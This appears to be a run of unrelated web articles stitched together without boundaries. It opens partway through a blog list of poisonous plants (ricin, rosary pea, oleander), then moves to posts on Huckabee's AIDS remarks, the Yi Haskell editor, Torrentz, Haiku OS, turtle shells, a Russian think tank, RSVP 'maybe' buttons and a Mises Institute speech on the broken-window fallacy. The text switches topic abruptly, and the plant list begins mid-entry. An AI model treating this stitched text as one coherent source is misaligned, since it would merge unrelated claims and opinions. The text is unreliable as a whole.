Markov , a dissident who broad casted scathing accounts of Communism in Bulgaria , had survived two previous assassination attempts when he was attacked at a bus stop by an unknown man who used a modified umbrella to shoot a ricin pellet into Markov ’s leg .
He soon developed a high fever ; and after four days of agony , was dead .
Castor beans also bear a remarkable resemblance to pinto beans ; and ricin is not generally tested for when symptoms present .
So if you fear that someone has it out for you , you may want to skip their offer of a chili dinner .
2. THE ROSARY PEA OR JERIQUITY BEAN
Latin Name : Abrus precatorius Linnaeus
Distance from my Door : 145 paces ( 290 feet )
Origin : India
USDA Plants Profile and Distribution Map
Toxicity
Although , similar to ricin , the toxic agents in the rosary pea ( abrin and abric acid ) are said to be even more poisonous .
If this is true it would trump ricin as the third most toxic substance known to man .
Chewing one small rosary pea imparts enough abrin to kill an adult human .
Since there is no known antidote for abrin , it is a good idea to avoid these little beauties altogether .
Signs and symptoms of abrin exposure
The symptoms of abrin poisoning are virtually the same as those of ricin .
There is no antidote for this one , either ; and only the symptoms can be treated .
The genus “ Abrus ” is derived from the Greek Habrus , meaning graceful , elegant or delicate .
The species epithet precatorius is Latin for prayer .
If you see this graceful plant on your property , you may pray that it does n’t take over , because it is so invasive that little , short of divine intervention , can stop it .
In one season , the vine is able to grow 20 feet , creating a twisted tangle over all plants that get in its way .
In India , the scarlet and black seed was called “ retti ” or “ rati ” .
Uniform in size and weighing approximately 2.1875 grains , they were used to weigh gem stones .
The brightly colored Rosary Peas get their name because they are strung for necklaces and rosaries .
For this reason the plant has been introduced worldwide .
Many teething toddlers have been poisoned by chewing on beads made from these deadly seeds .
3. THE OLEANDER
Latin Name : Nerium Oleander ( Oleander ) , Thevetia peruviana ( Yellow Oleander )
Distance from my Door : 36 paces ( 72 feet )
Origin : Africa , the eastern Mediterranean and southeast Asia
USDA Plants Profile and Distribution Map
This hardy evergreen shrub is cultivated as a landscape ornamental as well as on road medians and shoulders throughout the southern United States .
Despite it ’s drought tolerance and attractive appearance , Oleander is one of the most deadly plants around .
So deadly , in fact , that it has long been favored as an agent of both murder and suicide .
Toxicity
Every part of this plant is poisonous , including the flowers , seeds , leaves , sap , pollen , bark and roots .
The oleander contains a bevy of toxins including , oleandrin , nerin , digitoxigenen and olinerin .
The bark also contains rosagenin ( known for it ’s strychnine - like effects ) .
Signs and symptoms of oleandrin exposure
Oleander poisoning can take place through any exposure , including skin contact , ingestion and inhaling smoke from burned plants .
Symptoms of poisoning include skin irritation , loss of appetite , stomach pain , nausea , vomiting , diarrhea , heartbeat irregularities , low blood pressure , headache , fainting , disorientation , dizziness and cardiac arrest .
Due to the widespread use of oleander as a suicide agent in Sri Lanka , a digoxin antidote has been developed for oleandrin poisoning .
If treated in time , it is now possible to make a full recovery .
Despite its extreme toxicity , the oleander is considered very tasty to the Oleander Caterpillar Syntofeida epilais Walker .
In a brilliant feat of adaptation , the Oleander Caterpillar is thought to have switched over to the introduced Oleander , when it ’s original host plant Echites umbellata Jacq .
all but disappeared .
The appearance of the brilliant iridescent Polka Dot Wasp Moth is a good sign that an Oleander plant is nearby .
Huckabee spins himself in circles on AIDS quarantine
Yesterday , the AP highlighted some absurd comments from Mike Huckabee , offered during his 1992 Senate campaign , when he advocated isolating AIDS patients from the general public and warned that homosexuality could “ pose a dangerous public health risk . ”
“ If the federal government is truly serious about doing something with the AIDS virus , we need to take steps that would isolate the carriers of this plague [ from the general population ] , ” Huckabee wrote at the time .
By any reasonable standard , Huckabee ’s comments were ridiculous and offensive , but at least for his sake they were made 15 years ago .
Now , as a presidential candidate , he has an obvious course to take — claim ignorance and explain how far his understanding has progressed since 1992 .
( It may not be the most accurate tack — C. Everett Koop and the Surgeon General ’s office explained to the nation that the disease could not be contacted through everyday contact four years before Huckabee expressed support for a quarantine , but it ’s still his best strategic option . )
But the candidate who ’s still surprisingly far from being ready for prime - time has n’t yet learned how to respond to these questions .
On Fox News Sunday this morning , former Arkansas Gov. Mike Huckabee denied that he ever called for quarantining AIDS patients in 1992 , claiming that he “ did n’t say that we should quarantine , ” but that the onset of the AIDS epidemic “ was the first time in public health protocols ” that “ we did n’t isolate the carrier . ” [… ]
Huckabee then asserted that he stands by his 1992 comments , saying he would n’t “ run from ” or “ recant ” them .
Sweet Jeebus , it ’s as if this guy is practically trying to make himself appear foolish .
First , trying to parse the meaning of fairly plain language is ridiculous .
Based on his defense this morning , Huckabee did n’t say we “ should ” quarantine AIDS patients , he only said we “ must ” isolate them from the public .
It ’s hard to imagine even the conservative Republican base finding this coherent .
Second , he wo n’t “ recant ” obvious nonsense from 1992 ?
Why on earth not ?
There ’s no shame in saying , “ What I believed 15 years ago was mistaken . ”
For goodness sakes , Mitt Romney routinely suggests , “ What I believed 15 minutes ago was mistaken . ”
Huckabee can’t even concede making a mistake when it ’s this obvious ?
It gets back to a point I mentioned the other day —
Huckabee ’s easy skate to the GOP ’s top - tier is a double - edged sword .
On the one hand , he ’s been able to quietly sneak up on his rivals , who ’ve been going after one another and leaving Huckabee alone .
On the other hand , now that the race has reached crunch time , and Huckabee is a credible challenger for the nomination , all of the scrutiny comes at once , and the former governor has to be able to keep up .
So far , he ’s shown he ca n’t take the heat .
Pressed on the Wayne Dumond disaster , Huckabee has taken to lying about what transpired .
Pressed on the NIE , he dismisses reasonable inquiries about major news as “ gotcha questions . ”
Confronted with obvious stupidity from 1992 , he does n’t know how to distance himself from his own mistakes .
Does this guy even have a staff ?
Is there no one around to help prep him for these TV interviews ?
Credible presidential candidates just are n’t supposed to go on national television and parse the meaning of the word “ quarantine . ”
Getting started with Yi , the haskell editor ( 2008 )
What ’s Yi ?
Yi is an emacs - like editor written in haskell .
It is , as they say , made of awesome .
I first heard of Yi in early 2007 when Ben Moseley mentioned it at the pub during MGS 2007 .
It took me nearly a year to get around to looking at it .
But now that I have , I think it ’s really cool .
It ’s a text editor , with a GUI and lots of state - which is exactly the kind of app that most people think haskell is bad for .
But actually , that all works out very nicely thankyouverymuch .
And because yi is a text editor , and text editors just are n’t that complicated , it makes for a great educational application .
It ’s not ready for mainstream use though .
It needs a fairly bleeding edge configuration , and lots of functionality is missing .
But if you ’re looking to hack on a meaty haskell app , it ’s a great start .
What ’s here
I ’ve written a sequence of tutorial examples covering installation and basic extension programming to get you up to speed with Yi. Enjoy !
More random programming stuff and metal - melting fun on my home page and blog .
Help , I do n’t know haskell !
Haskell is the new scala , which is the new erlang , which is the new ruby .
It ’s what all the cool kids are using .
The fact that it ’s a beautiful and elegant language is irrelevant .
Succum to peer pressure !
I first learned Haskell back in 2001 from the excellent book The Haskell School of Expression by Paul Hudak .
Unlike many other book , it ’s full of useful examples involving graphics and animations .
Highly recommended .
The book does n’t spend very much time explaining monads , which are heavily used in Yi .
But over the last few years there have been a billion monad tutorials written on the web .
From our thread yesterday , a couple more good questions the rabble - rousers here at Balloon Juice would like to see posed to the GOP candidates . :
1. ) “ Would you have sex with a man to stop a terrorist attack ? ”
2. ) “ If lowering taxes results in increased revenues then would lowering taxes to zero result in infinite revenues ? ”
3. ) “ If you had a time machine , would you travel back in time and abort Bin Laden ? ”
4. ) “ Would you torture and kill Jesus to ensure mankind ’s salvation ?
And how does that work ? ”
Keep ’em coming , as we have a solid mission .
*** Update ***
5. ) “ If Russia entered Turkey from the rear would Greece help ? ”
6. ) For Rudy specifically : “ How many alimony checks does the sanctity of marriage cost ? ”
The popular BitTorrent meta - search engine Torrentz.com has introduced several new features , including " verified " movies and TV - shows .
The site is now hosted in multiple datacenters - with full redundancy - to guarantee optimal service to its users .
Torrentz , ranked 4th in our list of most popular BitTorrent sites of 2007 , has implemented quited a few changes over the past month .
Some people might have noticed that setting up the new features and servers led to some temporarily inconveniences , as users were not able to add comments or votes .
Luckily , the site is now fully operational again , with some great improvements and a new layout .
One of the most interesting enhancements to the site are the verified torrents .
Torrentz now marks all torrent files from trusted sources with a green checkmark .
These torrent files are uploaded by known groups such as aXXo , FxM , FXG and KLAXXON for movies , and EZTV for TV - shows .
This makes it easier to find out whether a file is legit or not .
These verified torrents are also listed on the frontpage of Torrentz , together with the search cloud .
Another interesting feature that was recently added is the profile page for registered users .
On the profile page users can check their recent activity such as comments and votes .
There also is an option to change the password and email address .
Flippy , the administrator of Torrentz.com told TorrentFreak that he also plans to add the most frequent searches for every individual user there .
Flippy further told us that he will add verified music torrents soon , most likely in a separate music section .
And , when all the major changes are implemented he might even consider to make Torrentz compatible with Internet Explorer 6 .
However , the speed of the site will always have the highest priority , no matter what .
When we asked him how many users Torrentz has at the moment , he told us that he had no clue , “ Installing a Google Analytics tracking code will slow the site down , ” he added .
For those who have n’t seen Torrentz ’ updates yet , have a look , it is without a doubt the fastest BitTorrent meta - search engine .
At the Southern California Linux Expo this past weekend , Google engineer and open - source software developer Bruno de Albuquerque gave a presentation about Haiku , a project devoted to creating an open - source clone of BeOS .
When desktop computing was first beginning its rapid climb towards ubiquity , a little company called Be developed what its users believed was one of the best desktop operating systems of its time .
BeOS featured a unique modular microkernel , a revolutionary 64 - bit journaling filesystem with database - like indexing and querying capabilities , support for preemptive multitasking , pervasive multithreading , and unrivaled clarity of design .
Unfortunately , BeOS never gained mainstream traction and faded into obscurity .
The Haiku project , which began shortly after the death of BeOS in 2001 , aims to bring together the technical advantages of BeOS and the freedom of open source .
The project has drawn dozens of contributors who have written over seven million lines of code .
Although Haiku is nearly feature - complete , there are still numerous bugs that must be fixed before it is ready for day - to - day use .
The design principles behind Haiku are very closely aligned with those of BeOS .
The central goal of the Haiku project is to create an operating system that is ideally suited for use on the desktop — this differs significantly from Linux and other open - source operating systems which are intended for use in a diverse range of settings including server and embedded environments .
The focus on desktop performance means that Haiku is designed from the ground up for optimal responsiveness .
" Our priority is to make a very good desktop OS , " said de Albuquerque .
" It 's very close to what BeOS was , and we have already improved over it . "
Indeed , Haiku closely mimics BeOS in virtually every respect and supports complete binary compatibility with BeOS R5 , the last major revision of the operating system .
Haiku also improves on BeOS in several ways .
Haiku 's network performance is better , for instance , because the networking functionality is integrated directly into the kernel rather than running in userspace as it did in BeOS .
Haiku also offers a source - level FreeBSD network driver compatibility layer , which means that it can support any network hardware that will work on FreeBSD .
Haiku also includes support for modern hardware , better filesystem performance , and support for vector icons .
Haiku has also improved POSIX compatibility in order to simplify the process of porting applications to the platform .
Haiku is developed in C++ and provides a powerful object - oriented API .
According to de Albuquerque , C++ is " the best option for writing an OS today , because it has the best balance of performance and readability . "
The main components of the platform are being developed as isolated kits , which include the media system , networking , preferences , storage , applications , and others .
These kits are all at varying levels of completion , but continue to evolve at a decent pace .
Haiku will come with its own web browser , says de Albuquerque , and it will utilize the lightweight WebKit rendering engine used by Safari .
The Haiku developers are also working closely with the OpenJDK project to bring reliable Java support to the operating system .
Haiku build images are generated nightly and are available in several formats .
I generally test Haiku with the VMware builds .
Like BeOS , Haiku boots in only a few seconds and has a very small footprint .
The uncompressed test images are only about 60 MB .
Haiku 's code base is distributed under the permissive MIT license because the developers want to encourage corporate involvement and believe that permissive licensing creates a healthier relationship with commercial industry .
During my own tests , I have found that Haiku is already very close to being a full replacement for the BeOS I knew and loved .
There are still very evident problems with stability , and I regularly encounter application crashes , but I have only seen the operating system itself crash twice during my recent experiments .
I also tested a few standard third - party BeOS applications .
Firefox will run on Haiku , but still has some serious rendering glitches and crashes often .
As an open source enthusiast and former BeOS zealot , I 'm very excited to see Haiku reach this level of usability .
I look forward to the day when it is a viable operating system for day - to - day use , and , when it achieves the requisite level of hardware compatibility , I fully intend to install it on my Eee PC , where Haiku 's extreme responsiveness and fast boot time will be of significant value .
Although Haiku and its technologies are n't quite as relevant today in the face of more modern and advanced operating systems , many of the traditional advantages of BeOS that are present in Haiku still have value today in some contexts .

For turtles , lying belly - up is a helpless , life - threatening situation .
Now it appears many turtles evolved shells with unique shapes to easily help them flip back onto their bellies if they find themselves on their backs .
" Before starting this project , I always thought animals such as turtles worked hard to right themselves , and what this showed was this need not be the case — they can just have a good shape for their shell that does most of the work , " applied mathematician Peter Varkonyi at the Budapest University of Technology and Economics in Hungary told LiveScience .
Turtle shells come in all shapes and sizes .
Aquatic turtles with flat shells well - suited for swimming often right themselves by pressing their heads against the ground with muscular necks , levering themselves onto their bellies .
However , if land turtles have high - domed shells , which offer better protection against the snapping jaws of predators , their necks and limbs may not be long enough to reach the floor and gain any leverage .
Varkonyi and his colleague Gabor Domokos investigated whether such high - domed shells had a special geometry that helped turtles right themselves .
They developed simple mathematical models of turtle shells by analyzing 30 shells from 17 aquatic and terrestrial species .
The researchers found the height , width and curvature of high - domed turtle shells was close to optimal for self - righting .
The way these shells balance turtle weight makes it easy for the reptiles to roll back onto their bellies with just a little effort , such as bobbing their heads or feet .
" We 'd like to see if there are beetles like this also , " Varkonyi said .
The findings are detailed online Oct. 17 in the journal Proceedings of the Royal Society B .
MOSCOW --
A new Russian - backed think tank is being set up to publicly critique the state of U.S. and European democracy as Moscow goes on the offensive to counter what it views as unjustified Western criticism of its own political system .
A prominent lawyer says President Vladimir Putin endorsed his plan to open monitoring offices in New York and Paris to study the U.S. and French political systems and recommend improvements .
Western criticism of what many see as Kremlin backsliding on democratic principles has long rankled Mr. Putin and his allies .
Recently , Moscow has taken a more assertive stance , firing back at countries whose governments have been particularly strident .
The skirmishing has deepened the chill in Russia 's relations with the West .
Those tensions were underlined yesterday as the British government said it would suspend the work of two Russian offices of its cultural arm , the British Council , citing " blatant intimidation " by Russian authorities .
Moscow accuses the organization of tax and legal violations , charges London rejects .
" We saw similar actions during the Cold War , but frankly thought that they had been put behind us , " United Kingdom Foreign Secretary David Miliband told lawmakers .
Seeking to deflect Western attacks on their repressive system , Soviet propagandists frequently took the U.S. and its Cold War allies to task for what Moscow called human - rights violations .
This time , the new think tank would provide " constructive " criticism , according to Anatoly Kucherena , the pro-Kremlin lawyer .

One view of the near future is that terrorists will get nukes and set the atmosphere on fire , or global warming will kill us all , or bird flu will create a pandemic , or the world economy will melt down , or all of those disasters will happen at once .
I suppose that ’s possible .
But I think it ’s more likely we are entering a golden age .
My Golden
Age prediction assumes technology will continue to surprise us , especially in the energy realm .
The high cost of oil has generated a seemingly endless parade of energy technology research and subsequent breakthroughs .
I mentioned a bunch of them in previous blogs .
Here ’s another example just from this week :
http://www.popularmechanics.com/science/earth/4243793.html
If even a fraction of the energy breakthroughs reported in the past year become reality , the economic implications are staggering .
It would be a bigger impact than the invention of computers or cars .
As the cost of energy approaches zero , and our skill at creating manufacturing robots improves , almost anyone will be able to afford almost anything .
Education will become universal once the cost of a laptop reaches $ 1 and it does n’t need to be plugged in .
With education comes more doctors , and the cost of healthcare will drop until everyone can afford it .
Medical science is proceeding at a staggering rate .
Now there ’s reason to believe even Alzheimer ’s will be treatable .

A friend of mine has a replacement hip .
Another friend has a new heart .
A third is going in soon for a new knee .
Even internal replacement organs are being grown in labs that will have no risk of rejection because they are made from your own cells .
Wars appear to be shrinking too .
World Wars I and II will probably be the final wars between major powers .
The biggest powers of today are more interested in being trading partners than foes .
As nations become more connected , via economics and the Internet , the risk of war decreases .
All war requires a certain degree of lying to the citizens , and the Internet will continue to make that harder .
We citizens will remain pessimistic about the future .
That ’s our way .
And that pessimism is exactly what we need to drive the technological advances that will bring the Golden Age .
If we trusted the Golden Age to come on its own , it would n’t .
It will take a lot of work .
Luckily , that work is happening .
Do you think we ’re entering a Golden Age ?
When I ’m planning an event , and I use a web service like evite® to send invitations , that web service offers three choices :
Yes , I ’ll come No , I wo n’t Maybe — I ’m not sure
“ Maybe ” is one option too many .
As a best practice , we should dispense with it , just as we should replace five - star rating systems with four - star ones .
The problem with five - star rating systems
Let users choose from five stars , and they nearly always pick three .
Three is the little bear ’s porridge , neither too hot nor too cold .
Three is neutral — a safe place to hide .
Even in the virtual world , where nothing more consequential is being asked than an opinion , many people would rather equivocate than commit .
But present these same users with a four - star spread and you leave them no cover .
Two stars out of four is not neutral .
Neither is three stars out of four .
Any star rating they choose will reflect an actual opinion .
There is no place to hide .
When there is no place to hide , courage arises out of necessity .
Force people out of the brush , and they develop the backbone needed to state an opinion .
The trouble with “ maybe ”
As data , “ maybe ” is as useless as a three - star rating in a five - star system — and as hypnotically compelling to users .
“ Maybe ” is a button that begs to be pushed .
Maybe is a magnet for neuroses .
It salves guilt complexes and incites passive - aggressive avoidance behaviors .
“ Maybe ” sometimes means maybe , but it can also mean , “ I ’m not coming but I do n’t want to hurt your feelings . ”
Or even , “ I plan to come but I reserve the right to change my mind at the last minute if something better comes along . ”
Some people even use maybe to mean , “ I wo n’t make dinner but I ’ll come for dessert . ”
When you invite twelve people to a restaurant dinner via a web service , at least four will say maybe .
Do you reserve a table for twelve ?
When eight show up and range themselves at opposite ends of the table ( “ because other people might be joining us ” ) you have an awkward table filled with gaps .
The empty seats haunt the meal , suggesting social failure .
But if you call the restaurant at the last minute to change the reservation to eight , two of the maybes will show up , like ants at a picnic .
They ’ll have nowhere to sit , and they ’ll blame you .
( “ I told you I might come . ” )
How can you know what “ maybe ” means ?
In the context of a web service , you can ’t .
All you can do is phone people and ask whether they ’re leaning toward coming or not — in other words , try to move them from a five - star three to a four - star two or three .
If they ’re the passive - aggressive type , they will continue to evade the snare of commitment .
“ I ’m probably coming , ” they ’ll say .
What is the solution ?
Use web services that offer a binary choice : “ I ’m coming ” or “ I ’m not coming . ”
If you ca n’t find such a service , build one .
If you run a web service that includes “ maybe , ” offer an optional two - choice ( “ no - maybe ” ) version .
When demand an outright yes or no , people generally supply it .
They only equivocate when handed the means to do so .

This talk was delivered at the 2008 Mises Circle in Houston .
The claim of the Austrian School that has scandalized members of other schools for 150 years is the following .
The propositions of economics are universal .
The principles apply in all times and all places , because they derive from the structure of reality and human action .
What brought about economic growth , inflation , or the business cycle in China 300 BC are the same institutions that drive phenomena in the United States in AD 2008 .
The circumstances of time and place change , but the underlying economic reality is identical .
That claim has made other economists — to say nothing of sociologists , historians , and politicians — scatter like pigeons .
The Historical School poured scorn on this idea , and Carl Menger , the founder of the Austrian School , fought them tooth and nail .
The Chicago School of positivists found the claim preposterous , and Mises and Hayek and Rothbard battled them .
The Keynesians have long been outraged , and the postwar Austrian generation reasserted the truth .
The socialists , who posit that rearranging property titles will transform all of reality , say that the claim is absurd , capitalistic nonsense .
But there it stands .
No matter where or when , the essential prerequisite for economic growth is capital accumulation in a framework of freedom and sound money .
The consequence of price control is shortage and surplus .
The effect of money expansion is inflation and the business cycle .
The effect of every form of intervention is to make society less prosperous than it would otherwise be .
The list of universals is endless , which is why every age needs good economists to explain and articulate the truth .
Well , I would like to add that there are universal fallacies too .
Frdric Bastiat pointed to one : the belief that the destruction of wealth fuels its creation .
He explains this by means of an allegory that has come to be known as the story of the broken window .
Most famously it was retold as the opening of Henry Hazlitt ’s Economics in One Lesson , which is probably the bestselling economics book of all time .
A kid throws a rock at a window and breaks it , and everyone standing around regrets the unfortunate state of affairs .
But then up walks a man who purports to be wise and all - knowing .
He points out that this is not a bad thing after all .
The man fixing the window will get money for doing so .
This will then be spent on a new suit , and the tailor too will get money .
The tailor will spend money on other items and the circle of rising prosperity will expand without end .
What ’s wrong with this scenario ?
As Bastiat put it , “ It is not seen that as our shopkeeper has spent six francs upon one thing , he cannot spend them upon another .
It is not seen that if he had not had a window to replace , he would , perhaps , have replaced his old shoes , or added another book to his library .
In short , he would have employed his six francs in some way which this accident has prevented . ”
You can see the absurdity of the position of the wise commentator when you take it to absurd extremes .
If the broken window really produces wealth , why not break all windows up and down the whole city block ?
Indeed , why not break doors and walls ?
Why not tear down all houses so that they can be rebuilt ?
Why not bomb whole cities so construction firms can get busy rebuilding ?
It is not a good thing to destroy wealth .
Bastiat puts it this way .
“ Society loses the value of things which are uselessly destroyed . ”
It sounds like an unexceptional claim .
But herein rests the core case against everything the government does .
Perhaps , then , we can see why the allegory is not better known .
If we took it seriously , we would dismantle the whole apparatus of American economic intervention .
If you are with me to this point , perhaps you have a hard time believing that anyone really believes that wealth destruction is actually a good thing .
Let me try to show that the fallacy is as pervasive as ever .
After every natural disaster , we at the Mises Institute start what we call the Broken Window Watch .
After Hurricane Katrina , the Labor Secretary said : “ What will happen — and I have seen this in previous catastrophes and hurricanes — there is a bright spot in that new jobs do get created . ”
And The Economist said , “ While big hurricanes like Katrina destroy wealth , they often have a net positive effect on GDP growth , as the temporary downturn immediately after the storm is more than made up for by the burst of economic activity that takes place when the rebuilding begins . ”
And the New York Times said : “ Economists point out that although Katrina has destroyed a lot of accumulated wealth , it ultimately will probably have a positive effect on growth data over the next few months as resources are channeled into rebuilding . ”
After last year ’s California fires , we heard this .
“ In the odd nature of economic accounting , this will probably be a stimulus , ” said Alan Gin , a University of San Diego economist .
“ There will be a huge amount of rebuilding in the next couple of years , financed by insurance payments . ”
And CBS Marketwatch said : “ Economists have noted the perverse reality that in the wake of disasters , re-construction spending helps the economy , even as people are still struggling to recover from their personal losses . ”
Note that personal loss here is deemed rather irrelevant compared with the beneficial macroeconomic results .
Here we have a theme we find often in economics , the attempt to drive a wedge between what makes sense for individuals and what is good for society .
We see this on display in this recessionary environment , when people are told to spend spend spend , even though most people understand that recessions are times for saving .
Continuing on , we find the Broken Window fallacy popping up even after 9 - 11 .
Timothy Noah of Slate wrote : “ We live in a very wealthy nation that responds to horrible disasters by spending large sums of money … .
It will also provide a meaningful Keynesian stimulus to a national economy that , let ’s face it , was tottering on the brink of recession well before Sept. 11 .
The recession may still come , but the countercyclical spending should help shorten it . ”
Another economist declared : “ Initially , this could provide a significant boost to an economy that had been slumping .
The construction industry could benefit from the rebuilding process .
There may also be a boon for slumping tech sales , in replacing lost equipment . ”
Thus can we see the continuing relevance not only of Bastiat ’s allegory but also of the characters in the story .
The posturing wiseguy who says that breaking windows is good for the economy keeps reappearing again and again .
So entrenched is this mistake that we might call it official economic doctrine for the whole country .
I ask you to consider the absurd discussion of a stimulus package designed to rescue the economy from recession .
The idea is that the government will inject funds into private markets to stimulate them to the point that they will run on their own .
Not once in this debate have I heard anyone ask the core question : where is this money going to come from ?
It seems that Washington wants us to believe that they have some magic machine that can turn up $ 150 billion in new assets without anyone having to do anything to make these assets appear .
One wonders , then , why we need to wait until a recession to stimulate the economy .
Why not magically create hundreds of billions every day , and not just for this country but for the entire world ?
Why are we holding back ?
Now , the ideas of the stimulus package are not 100 % awful .
Some people are talking about tax cuts , which is a good thing but rather pointless without spending cuts .
I ’m particularly intrigued by the underlying assumption here that taxes work as a drag on an economy whereas tax cuts fuel expansion .
If that is the case , and is indeed true but for different reasons than Washington gives , why wait until the recession to cut taxes ?
If taking less from us is good for the economy , we should institute this as a universal policy .
One great lesson of political economy , emphasized for centuries , is that the government creates no wealth of its own .
Everything it has it has to get from you and me , one way or another .
It can tax .
It can borrow .
And , finally , it can inflate by means of credit market manipulation .
This third option is the most disguised .
When people hear the words monetary policy , they figure that this is something they will leave to experts .
And central bankers have an astonishing talent for obfuscation to the point that no one knows with certainty precisely what they are doing .
The whole show is designed to make us go to sleep and not think about what is really going on .
The unvarnished truth is that when the Fed artificially lowers rates , it is creating new money that waters down the value of the existing money stock , yielding a lower purchasing power for the dollar .
That ’s another way of saying that it creates inflation — perhaps not right away , and perhaps not across all economic sectors , but eventually and certainly .
This , my friends , is a form of breaking windows .
It is wealth destruction .
It matters not that there will be more dollars to spend , because prices will be higher and wealth has been drained out of the private sector , and redistributed within it .
It is Bastiat ’s fallacy reinvented in a new form .
New money also distorts production structures .
At the very time when the market is pressuring long - term investment to pull back , the lower rates encourage expansion in ways that prolong the crisis .
It only delays and worsens the inevitable .
The Great Depression taught us that government is capable of doing this to the point that the crisis can last for 17 years .
So this is no small matter .
A government determined to prevent recession is a government that might end up sustaining one to the point of the collapse of civilization itself .
It is a perverse belief , but pervasive nonetheless .
It is believed by both political parties .
It is held by the president , the media , and the congress ( except for Ron Paul ) .
It is a reflexive belief , one that reflects a failure to think between stages and see the unseen effects of government intervention .
One reason that Bastiat ’s example has power is that it applies not just in one area of policy but all areas .
If it is n’t true that breaking windows creates wealth , it is not true that government spending and inflating is a boon to the economy .
It only ends up draining wealth from the private sector , which is the only source of wealth creation .
It does n’t matter what the government spends money on .
For example , building pyramids with tax dollars is not good for the economy , despite what Keynes claimed .
But neither is waging war good for us or the victim country , despite constant claims to the contrary .
It is surely one of the most deadly myths that the Second World War ended the depression .
As Robert Higgs has shown , it further prolonged it , all phony data aside .
And consider the spending on the war on terror .
If government spending were capable of stimulating the economy , we would not have recession right now .
Chris Westley assembled some data on the last seven years of economic conditions , and it is sobering indeed .
Since 2000 , tax revenues are up 25 % .
That ’s wealth destruction .
Government spending is setting records for expansion , with $ 1 trillion added to the annul budget , with military spending up $ 250 billion each year over the egregious $ 400 billion spent annually in 2000 .
That ’s wealth destruction .
The national debt is up 59 % .
That has to be paid .
More destruction .
Social security liabilities are up 60 % .
That too is the promise of future destruction .
The money supply is up 72 % .
More destruction .
Inflation itself has risen 20 % , so the dollar of 2000 is now worth 80 cents .
The gas price alone is up 118 % , so that too is wealth destroyed .
As an indication of economic trouble , the gold price is up 206 % .
Here is the story so far of the government ’s great stimulus .
It has led to hard economic times .
More of the same will create more of the same and worse .
The unemployment rate is rising .
Savings are falling .
Prices are rising .
We are less secure , less prosperous , and we have fewer opportunities than ever to dig our way out of this mess .
Government expansion has actually created the absurd scenario mentioned above .
The boy threw the rock , the crowds in Washington believed the sophist , and now they are plotting to raze all homes on the block , in the name of economic recovery .
Have we learned from the Great Depression ?
Ben Bernanke believes that he has learned something .
He believes that the key problem of that period was a failure of the central bank to pump in enough money and credit .
He has never absorbed the critical observation of Rothbard that the Fed did attempt to pump up the money supply from 1929 — 1934 .
They used every mechanism , but the credit markets found few takers , and without their cooperation , the money supply does not expand .
The real lesson of the Great Depression is that there is nothing that the central bank can do to forestall a recession whose time has come , and nothing government can do to improve the situation once the recession has arrived .
Everything it attempts to do — except shrink — only ends up making matters worse .
So it is in our time .
We must ask ourselves what Washington is capable of doing this time around .
I believe that the answer is anything and everything .
Bernanke will attempt to flood the economy with money .
Washington is perfectly capable of imposing price and wage controls on the entire economy .
It is capable of terrifying levels of protectionist legislation .
New taxes are less likely but taxation through debt accumulation is probably inevitable .
There might be rationing , spending mandates , anti-hoarding legislation , and more .
The assumption that driving up consumption is the key to prosperity is particularly dangerous , and also pregnant with irony .
During good economic times , we are hounded constantly by the intellectual elites for our consumption habits .
It is said that we are a greedy nation , buying ever more fripperies and not looking after the long term .
The American public is decried by the intellectual elites as materialist , consumerist , and short sighted .
Then recession hits and the tune changes completely .
Reliable leftists , fresh from having complained about the egregious spending habits of the American consumer , suddenly turn on a dime and tell us that more consumption is the key to economic growth .
They favor policies that would get us to fork over ever more of our money , under the belief that the core problem is a lack of demand !
A recent example is Barack Obama , who said last year that the problem with popular culture is that it “ saturates our airwaves with a steady stream of sex , violence and materialism . ”
But only this week , he seemed to endorse one of the three .
“ If the economy continues to decline in the coming weeks , we should send checks to people , " he said .
“ This is the quickest way to help people pay their bills and get them to start spending . ”
In fact , less spending and more saving is what is called for during a recession , which is nothing but a market correction writ large .
Attempting to coerce spending threatens the value of the dollar itself .
Here we face a very dangerous situation .
If the dollar ever ceases to be the international currency of choice , and this could happen , we could face roaring inflation .
And with dreadful legislation that prohibits any kind of choice in currency , Americans will be stuck .
Here is a problem that could cause near panic in Washington .
The irony here is that after a century of failed interventionism and socialism , Washington is no less likely , and probably far more likely , to take the path of least resistance and accumulate ever more power unto itself , at our expense .
We are in an election season , so of course people ask who would be the least bad person to head the state in the years ahead .
The answer here is not at all clear , if it is not Dr. Paul .
As with the 1930s we face a choice between militaristic fascism and Keynesian - style socialism combined with environmentalism .
These are two very grim choices .
I tell you this not to spread gloom but merely to be realistic about the prospects for the future of American politics .
But there is also good news to be considered .
The private sector has raced so far ahead of the state , and is so global , that it is far more resilient than before .
There are safety valves available in the form of international capital markets .
The government is so much bigger now than in the 1930s , but , paradoxically , that also makes it less effective than it once was , which is very good news .
It is a massive , lumbering giant , whereas the markets are a speed racer .
I might also point out that the government enjoys nowhere near the respect it once had .
Once the governing elite consisted of the nation ’s elite , coming from the best families and the best schools .
Today , the governing elite has never been more transparently ridiculous and even freakish .
Gone are the aristocratic public servants of yesterday ; today , the government is made up of a class of hucksters and gangsters that inspires no confidence .
This is all to the good , for as Mencken said , it is always great when we do not get all the government we pay for .
On the intellectual level , the teachings of economics in the Austrian School tradition have never been more available to the world , or more frequently cited and discussed .
And a recessionary environment guarantees more attention to the Austrian theory of the business cycle simply because this is the only model that makes sense of our current problems .
We should never underestimate the power of ideas to make a difference in the world .
During the Great Depression , the resistance to the state was present but weak .
Today we have built up a mighty intellectual army that extends across the globe .
We are prepared in ways that they were not .
We have thousands of students and faculty , and men and women of affairs who know real economics .
We have the internet .
We have new books that put the whole problem in perspective , such as Jess Huerta de Soto ’s work on business cycles .
We have the biography of Mises now , and it illustrates the heroism of political dissidence .
The works of Rothbard on the Great Depression and central banking have never been more widely circulated and available .
This time our masters in Washington will not go unopposed .
At the Mises Institute , now in our 26th year , we tried to maintain a careful balance between serious and fundamental scholarly work , and public advocacy .
We must never lose sight of the need for research and detailed work .
It is not enough to merely repeat slogans .
At the same time , there are some foundational lessons of economics that must be taught again and again with each new generation .
The fallacy of the Broken Window is one of them , and its implications are truly radical .
Both Bastiat and Hazlitt saw that the government is the great window breaker , that destroyer of wealth that drives the economy backwards .
The engine of creativity , recovery , and expansion is the private sector , completely unencumbered by state intervention .
Ron Paul ’s newest book is called Pillars of Prosperity : Free Markets , Sound Money , and Private Property .
The title nicely sums up the message of the economics of freedom .

Departed Bush aide Karl Rove dodges question about McClellan 's Plame revelations

